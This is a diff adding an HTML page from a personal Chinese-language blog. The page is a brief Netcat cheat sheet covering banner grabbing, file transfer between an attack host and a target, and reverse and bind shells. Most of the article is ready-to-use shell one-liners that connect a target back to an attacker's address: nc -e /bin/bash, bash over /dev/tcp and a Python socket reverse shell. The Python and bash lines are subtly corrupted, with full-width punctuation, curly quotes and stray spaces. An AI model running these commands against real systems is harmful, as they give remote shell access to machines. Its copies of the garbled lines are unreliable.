@@ -1,0 +1,155 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Netcat 工具使用 | fanson&#39;s Blog</title>
+
+  
+  <meta name="author" content="fanson">
+  
+
+  
+  <meta name="description" content="Netcat的工具使用总结：一，Netcat Banner获取
+1nc [ip-address] [port]
+二，文件传输
+例如我们想在目标主机上执行远程命令，所以需要将文件从攻击主机传输到目标主机。首先，设置一个侦听器，并从攻击主机连接到它。使用端口8888用于此目的，将该文件安全保存到桌面
+1">
+  
+
+  
+  
+  <meta name="keywords" content="Tools">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Netcat 工具使用"/>
+
+  <meta property="og:site_name" content="fanson&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="fanson&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+</head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">fanson&#39;s Blog</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Netcat 工具使用</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2018/12/03/Netcat-工具使用/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-12-03T15:06:06.000Z">
+          2018-12-03
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h4 id="Netcat的工具使用总结："><a href="#Netcat的工具使用总结：" class="headerlink" title="Netcat的工具使用总结："></a>Netcat的工具使用总结：</h4><p>一，Netcat Banner获取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port]</span><br></pre></td></tr></table></figure>
+<p>二，文件传输</p>
+<p>例如我们想在目标主机上执行远程命令，所以需要将文件从攻击主机传输到目标主机。首先，设置一个侦听器，并从攻击主机连接到它。使用端口8888用于此目的，将该文件安全保存到桌面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888 &gt; 文件路径</span><br></pre></td></tr></table></figure>
+<p>在攻击机上，我们连接到该8888端口并发送文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] &lt; 文件路径</span><br></pre></td></tr></table></figure>
+<p>三，Bind Shells &amp;Reverse Shells</p>
+<p>在渗透测试中，最常见，或者最受欢迎的用法是反向 reverse shell和正向bind shell。反向shell是从目标主机发起到处于监听状态的攻击机器的shell连接方式，又叫被动连接，而正向bind shell是攻击主机通过特定的端口进行侦听目标主机即将到来的连接。在恶意软件中，bind shell又通常被称为后门。</p>
+<p>Reverse Shell:</p>
+<p>1.设置一个Netcat侦听器，（我们侦听端口8888）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888</span><br></pre></td></tr></table></figure>
+<p>2.接下来我们在目标主机上执行下面的命令来连接我们的攻击主机（记住我们在这个攻击主机上执行了远程代码）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc [ip-address] [port] -e /bin/bash    &lt;for linux&gt;</span><br><span class="line">nc.exe [ip-address] [port] -e cmd.exe  &lt;for windows&gt;</span><br></pre></td></tr></table></figure>
+<p>若目标主机没有Netcat，我们使用其他方法来代替</p>
+<p>Bash反向shell，使用Bash通过使用以下命令从目标主机启动反向shell连接攻击主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; &amp;/dev/tcp/[ip-address]/[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>python反向shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c’import socket，subprocess，os; s = socket.socket(socket.AF_INET，socket.SOCK_STREAM); s.connect((“[ip-address]”，[port])); os.dup2（s.fileno()，0); os.dup2(s.fileno()，1); os.dup2(s.fileno()，2); P = subprocess.call([“/ bin / sh”，” - i”]);”</span><br></pre></td></tr></table></figure>
+<p>Bind Shell:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Attacker:nc [ip-address] [port]</span><br><span class="line">Target:  nc -lvp [port] -e /bin/sh</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Tools/">Tools</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2019 fanson
+    
+  </p>
+</footer>
+    
+  </div>
+</div>
+<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
